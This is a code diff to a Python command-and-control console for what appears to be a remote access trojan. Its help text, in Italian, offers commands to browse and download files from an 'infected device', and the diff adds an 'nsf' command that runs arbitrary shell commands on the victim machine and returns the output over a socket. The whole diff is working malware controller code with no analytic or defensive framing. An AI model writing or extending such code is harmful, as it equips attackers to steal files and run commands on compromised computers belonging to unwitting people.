@@ -118,7 +118,6 @@ def longRecv(connectionSocket):
     while numofpackets > 0:
         data = connectionSocket.recv(1024)
         output += data.decode()
-        print(numofpackets)
         numofpackets = numofpackets - 1
 
     print(output)
@@ -157,7 +156,7 @@ def main():
                    "filesystem \nget [nome file]                 scarica il file dal dispositivo infetto\nesc                             chiudi la " \
                    "sessione \nhelp                            guida comandi\ncd                              change directory\ndir/ls                          listing " \
                    "directory \ncls                             clear console\npwd                             print working directory \nsetOs to change osType" \
-                   "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]"
+                   "\nrf [<data>YYYY-MM-DD]           mostra file più recenti [a partire da <data>]\nnsf [comando shell]             esegue comando shell [potrebbe crashare se non esiste]"
             while not esc:
                 cmd = input('>>')
                 connectionSocket.send(cmd.encode())
@@ -207,8 +206,13 @@ def main():
                             print("Too forward")
                         else:
                             recentFiles(connectionSocket)
-                else:
+
+                elif "dir" in cmd or "ls" in cmd:
                     output = longRecv(connectionSocket)
+
+                elif "nsf" in cmd:
+                    output = longRecv(connectionSocket)
+
 
         except Exception as e:
             print(e)
